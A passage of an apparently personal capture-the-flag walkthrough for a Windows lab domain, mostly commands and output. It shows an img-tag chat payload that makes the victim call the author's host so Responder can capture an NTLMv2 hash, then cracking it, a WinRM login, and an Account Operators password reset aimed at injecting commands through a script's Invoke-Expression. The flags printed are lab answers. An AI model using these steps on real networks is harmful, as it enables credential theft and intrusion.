        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Videos
        .\Users\Default\AppData\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Local
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Roaming
        .\Users\Default\AppData\Local\*
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    .
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    ..
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Application Data
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    History
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Microsoft
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Temp
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Temporary Internet Files
        .\Users\Default\AppData\Local\Microsoft\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    InputPersonalization
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Windows
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Windows Sidebar
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    WindowsApps
        .\Users\Default\AppData\Local\Microsoft\InputPersonalization\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    TrainedDataStore
        .\Users\Default\AppData\Local\Microsoft\Windows\*
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    .
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    CloudStore
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    GameExplorer
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    History
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    INetCache
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    INetCookies
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Shell
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Temporary Internet Files
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    WinX
        .\Users\Default\AppData\Local\Microsoft\Windows Sidebar\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Gadgets
        fr--r--r--               80 Thu Apr 30 20:33:04 2020    settings.ini
        .\Users\Default\AppData\Roaming\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Microsoft
        .\Users\Default\AppData\Roaming\Microsoft\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Internet Explorer
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Windows
        .\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Quick Launch
        .\Users\Default\AppData\Roaming\Microsoft\Windows\*
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    .
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    CloudStore
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Network Shortcuts
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Printer Shortcuts
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Recent
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    SendTo
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Start Menu
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Templates
        .\Users\Default\Documents\*
        dw--w--w--                0 Thu Apr 30 19:35:11 2020    .
        dw--w--w--                0 Thu Apr 30 19:35:11 2020    ..
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    My Music
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    My Pictures
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    My Videos


A share called “Shared” was enumerated and we can see the flag and some executables. 

┌──(kali㉿kali)-[~/ra]
└─$ smbclient //windcorp.thm/Shared -U lilyle --password ChangeMe#1234
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 29 20:45:42 2020
  ..                                  D        0  Fri May 29 20:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 11:32:36 2020
  spark_2_8_3.deb                     A 29526628  Fri May 29 20:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 07:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 07:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 07:07:24 2020

                15587583 blocks of size 4096. 10891273 blocks available
smb: \> mget *
Get file Flag 1.txt? yes
getting file \Flag 1.txt of size 45 as Flag 1.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
Get file spark_2_8_3.deb? yes
parallel_read returned NT_STATUS_IO_TIMEOUT

adding a timeout (-t) to fix error

┌──(kali㉿kali)-[~/ra]
└─$ smbclient -t 500 //windcorp.thm/Shared -U lilyle --password ChangeMe#1234
Try "help" to get a list of possible commands.
smb: \> get spark_2_8_3.deb 
getting file \spark_2_8_3.deb of size 29526628 as spark_2_8_3.deb (319.8 KiloBytes/sec) (average 319.8 KiloBytes/sec)
smb: \> exit

installing deb (spark)

┌──(kali㉿kali)-[~/ra]
└─$ sudo dpkg -i spark_2_8_3.deb                                             
[sudo] password for kali: 
Selecting previously unselected package spark-messenger.
dpkg: regarding spark_2_8_3.deb containing spark-messenger, pre-dependency problem:
 spark-messenger pre-depends on openjdk-8-jre | oracle-java8-jre
  openjdk-8-jre is not installed.
  oracle-java8-jre is not installed.

dpkg: error processing archive spark_2_8_3.deb (--install):
 pre-dependency problem - not installing spark-messenger
Errors were encountered while processing:
 spark_2_8_3.deb




┌──(kali㉿kali)-[~/ra]
└─$ cat Flag\ 1.txt 
THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}   



https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md

I solve the problem just download debian package which is not necessary Java 
https://igniterealtime.org/downloads/index.jsp#spark

now sending msg to buse
like

Hey bro, look at this,  <img src="http://10.8.19.103/wittyAle.jpg">

first start responder to get hash pass

┌──(kali㉿kali)-[~/ra]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.19.103]

nice!

[+] Listening for events...                                                            

[HTTP] NTLMv2 Client   : 10.10.132.73
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:df6b0be31e96d0aa:E983E1EF51AC507CBBA7409ACFA9627B:01010000000000006AAB80949AFED80133A8C26CA15C55710000000002000800590055005200300001001E00570049004E002D004700510045003800560057005A0049003900390042000400140059005500520030002E004C004F00430041004C0003003400570049004E002D004700510045003800560057005A0049003900390042002E0059005500520030002E004C004F00430041004C000500140059005500520030002E004C004F00430041004C000800300030000000000000000100000000200000DFD055BB82E5CF4CF0F8E3A59D4F0D7D6FE770C6FE68AC5D04ED6A92644ED6CA0A00100000000000000000000000000000000000090000000000000000000000                                                                                  
[*] Skipping previously captured hash for WINDCORP\buse

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

using john to crack

┌──(kali㉿kali)-[~/ra]
└─$ echo 'buse::WINDCORP:df6b0be31e96d0aa:E983E1EF51AC507CBBA7409ACFA9627B:01010000000000006AAB80949AFED80133A8C26CA15C55710000000002000800590055005200300001001E00570049004E002D004700510045003800560057005A0049003900390042000400140059005500520030002E004C004F00430041004C0003003400570049004E002D004700510045003800560057005A0049003900390042002E0059005500520030002E004C004F00430041004C000500140059005500520030002E004C004F00430041004C000800300030000000000000000100000000200000DFD055BB82E5CF4CF0F8E3A59D4F0D7D6FE770C6FE68AC5D04ED6A92644ED6CA0A00100000000000000000000000000000000000090000000000000000000000' > hash
                                                                                       
┌──(kali㉿kali)-[~/ra]
└─$ ls
'Flag 1.txt'   hash   spark_3_0_0.deb
                                                                                       
┌──(kali㉿kali)-[~/ra]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash        
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
uzunLM+3131      (buse)     
1g 0:00:00:02 DONE (2022-11-22 12:51) 0.4950g/s 1465Kp/s 1465Kc/s 1465KC/s v0yage..uya051
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

or using hashcat

┌──(kali㉿kali)-[~/ra]
└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

BUSE::WINDCORP:df6b0be31e96d0aa:e983e1ef51ac507cbba7409acfa9627b:01010000000000006aab80949afed80133a8c26ca15c55710000000002000800590055005200300001001e00570049004e002d004700510045003800560057005a0049003900390042000400140059005500520030002e004c004f00430041004c0003003400570049004e002d004700510045003800560057005a0049003900390042002e0059005500520030002e004c004f00430041004c000500140059005500520030002e004c004f00430041004c000800300030000000000000000100000000200000dfd055bb82e5cf4cf0f8e3a59d4f0d7d6fe770c6fe68ac5d04ed6a92644ed6ca0a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BUSE::WINDCORP:df6b0be31e96d0aa:e983e1ef51ac507cbba...000000
Time.Started.....: Tue Nov 22 12:53:25 2022 (9 secs)
Time.Estimated...: Tue Nov 22 12:53:34 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   488.0 kH/s (1.20ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2959360/14344385 (20.63%)
Rejected.........: 0/2959360 (0.00%)
Restore.Point....: 2958336/14344385 (20.62%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: v&pixs -> uyab_cakep
Hardware.Mon.#1..: Util: 54%

Started: Tue Nov 22 12:52:38 2022
Stopped: Tue Nov 22 12:53:36 2022

now using credentials to login with Evil-WinRm

┌──(kali㉿kali)-[~/ra]
└─$ evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\buse\Documents> ls
*Evil-WinRM* PS C:\Users\buse\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\buse\Desktop> ls


    Directory: C:\Users\buse\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2020   3:00 AM                Also stuff
d-----         5/7/2020   2:58 AM                Stuff
-a----         5/2/2020  11:53 AM             45 Flag 2.txt
-a----         5/1/2020   8:33 AM             37 Notes.txt


*Evil-WinRM* PS C:\Users\buse\Desktop> type 'Flag 2.txt'
THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
*Evil-WinRM* PS C:\Users\buse\Desktop> type Notes.txt
I really should be better at taking n
*Evil-WinRM* PS C:\Users\buse\Desktop> cd Stuff
*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff> ls


    Directory: C:\Users\buse\Desktop\Stuff


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2020   2:58 AM                Passwords


*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff> cd Passwords
*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> ls


    Directory: C:\Users\buse\Desktop\Stuff\Passwords


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2020   2:58 AM              8 Facebook.txt


*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> type Facebook.txt
password
*Evil-WinRM* PS C:\Users\buse> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/10/2020   4:18 AM                Administrator
d-----         5/1/2020   5:59 AM                angrybird
d-----         5/1/2020   5:59 AM                berg
d-----         5/1/2020   5:59 AM                bluefrog579
d-----         5/2/2020   4:36 PM                brittanycr
d-----         5/1/2020   5:59 AM                brownostrich284
d-----       11/22/2022   8:29 AM                buse
d-----         5/1/2020   5:59 AM                edward
d-----         5/2/2020   4:30 PM                freddy
d-----         5/1/2020   5:59 AM                garys
d-----       11/22/2022   9:56 AM                goldencat416
d-----         5/1/2020   5:59 AM                goldenwol
d-----         5/1/2020   5:59 AM                happ
d-----         5/1/2020   5:59 AM                happyme
d-----         5/1/2020   5:59 AM                Luis
d-----         5/1/2020   5:59 AM                orga
d-----         5/1/2020   5:59 AM                organicf
d-----       11/22/2022   9:56 AM                organicfish718
d-----         5/1/2020   5:59 AM                pete
d-r---        4/30/2020   7:35 AM                Public
d-----         5/1/2020   5:59 AM                purplecat
d-----         5/1/2020   5:59 AM                purplepanda
d-----         5/1/2020   5:59 AM                sadswan
d-----       11/22/2022   9:59 AM                sadswan869
d-----         5/1/2020   5:59 AM                sheela
d-----         5/1/2020   5:59 AM                silver
d-----         5/1/2020   5:59 AM                smallf
d-----         5/1/2020   5:59 AM                spiff
d-----         5/1/2020   5:59 AM                tinygoos
d-----         5/1/2020   5:59 AM                whiteleopard

*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls
Access to the path 'C:\Users\Administrator' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

*Evil-WinRM* PS C:\Users> cd ..
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/2/2020   6:33 AM                inetpub
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---         5/8/2020   7:43 AM                Program Files
d-----         5/7/2020   2:51 AM                Program Files (x86)
d-----         5/3/2020   5:48 AM                scripts
d-----        5/29/2020   5:45 PM                Shared
d-r---         5/2/2020   3:05 PM                Users
d-----        5/30/2020   7:00 AM                Windows


*Evil-WinRM* PS C:\> cd scripts
*Evil-WinRM* PS C:\scripts> ls


    Directory: C:\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/3/2020   5:53 AM           4119 checkservers.ps1
-a----       11/22/2022  10:01 AM             31 log.txt


*Evil-WinRM* PS C:\scripts> cat log.txt
Last run: 11/22/2022 10:01:15
*Evil-WinRM* PS C:\scripts> cat checkservers.ps1
# reset the lists of hosts prior to looping
$OutageHosts = $Null
# specify the time you want email notifications resent for hosts that are down
$EmailTimeOut = 30
# specify the time you want to cycle through your host lists.
$SleepTimeOut = 45
# specify the maximum hosts that can be down before the script is aborted
$MaxOutageCount = 10
# specify who gets notified
$notificationto = "brittanycr@windcorp.thm"
# specify where the notifications come from
$notificationfrom = "admin@windcorp.thm"
# specify the SMTP server
$smtpserver = "relay.windcorp.thm"

# start looping here
Do{
$available = $Null
$notavailable = $Null
Write-Host (Get-Date)

# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p
if($p)
    {
     # if the Host is available then just write it to the screen
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
     [Array]$available += $_
    }
else
    {
     # If the host is unavailable, give a warning to screen
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue
     if(!($p))
       {
        # If the host is still unavailable for 4 full pings, write error and send email
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White
        [Array]$notavailable += $_

        if ($OutageHosts -ne $Null)
            {
                if (!$OutageHosts.ContainsKey($_))
                {
                 # First time down add to the list and send email
                 Write-Host "$_ Is not in the OutageHosts list, first time down"
                 $OutageHosts.Add($_,(get-date))
                 $Now = Get-date
                 $Body = "$_ has not responded for 5 pings at $Now"
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                  -Subject "Host $_ is down" -SmtpServer $smtpserver
                }
                else
                {
                    # If the host is in the list do nothing for 1 hour and then remove from the list.
                    Write-Host "$_ Is in the OutageHosts list"
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut)
                    {$OutageHosts.Remove($_)}
                }
            }
        else
            {
                # First time down create the list and send email
                Write-Host "Adding $_ to OutageHosts."
                $OutageHosts = @{$_=(get-date)}
                $Body = "$_ has not responded for 5 pings at $Now"
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                 -Subject "Host $_ is down" -SmtpServer $smtpserver
            }
       }
    }
}
# Report to screen the details
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count
Write-Host "Not available count:"$notavailable.count
Write-Host "Not available hosts:"
$OutageHosts
Write-Host ""
Write-Host "Sleeping $SleepTimeOut seconds"
sleep $SleepTimeOut
if ($OutageHosts.Count -gt $MaxOutageCount)
{
    # If there are more than a certain number of host down in an hour abort the script.
    $Exit = $True
    $body = $OutageHosts | Out-String
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer
}
}
while ($Exit -ne $True)

This takes whatever is in that hosts.txt file in Brittany’s folder and uses Invoke-Expression.
which tells us that “C:\Users\brittanycr\hosts.txt” is being run/used automatically.
We need to get access to that hosts.txt file. Let’s check what permissions we have and what groups we’re in.

*Evil-WinRM* PS C:\scripts> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\scripts> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

*Evil-WinRM* PS C:\scripts> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ============================================
windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

We see that we are part of the Account Operators group that means we can modify all accounts except admin accounts. 

*Evil-WinRM* PS C:\scripts> .\checkservers.ps1
11/22/2022 10:07:11 AM
Access is denied
At C:\scripts\checkservers.ps1:25 char:1
+ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
Cannot find path 'C:\Users\brittanycr\hosts.txt' because it does not exist.
At C:\scripts\checkservers.ps1:25 char:1
+ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
Last run: 11/22/2022 10:07:12
Access to the path 'C:\scripts\log.txt' is denied.
At C:\scripts\checkservers.ps1:81 char:1
+ Set-Content -Path C:\scripts\log.txt -Value $log
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Set-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.SetContentCommand
Available count: 0
Not available count: 0
Not available hosts:

Sleeping 45 seconds
11/22/2022 10:07:57 AM
Access is denied
At C:\scripts\checkservers.ps1:25 char:1
+ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
Cannot find path 'C:\Users\brittanycr\hosts.txt' because it does not exist.
At C:\scripts\checkservers.ps1:25 char:1
+ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
Last run: 11/22/2022 10:07:57
Access to the path 'C:\scripts\log.txt' is denied.
At C:\scripts\checkservers.ps1:81 char:1
+ Set-Content -Path C:\scripts\log.txt -Value $log
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Set-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.SetContentCommand
Available count: 0
Not available count: 0
Not available hosts:

Sleeping 45 seconds

Since we are part of the Account Operators group let’s reset the password for the account “brittanycr”.
*Evil-WinRM* PS C:\scripts> net user brittanycr 
User name                    brittanycr
Full Name                    Brittany Cruz
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/3/2020 6:15:48 AM
Password expires             6/14/2020 6:15:48 AM
Password changeable          5/4/2020 6:15:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/3/2020 5:27:42 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\scripts> net user brittanycr witty
net.exe : The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements.
    + CategoryInfo          : NotSpecified: (The password do...y requirements.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

More help is available by typing NET HELPMSG 2245.

more secure

*Evil-WinRM* PS C:\scripts> net user brittanycr witty123#
The command completed successfully.

or

*Evil-WinRM* PS C:\scripts> net user brittanycr witty123# /domain
The command completed successfully.

We can then see we can upload to the hosts.txt file:

┌──(kali㉿kali)-[~/ra]
└─$ smbclient //windcorp.thm/users -U brittanycr --password witty123#
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat May  2 18:05:58 2020
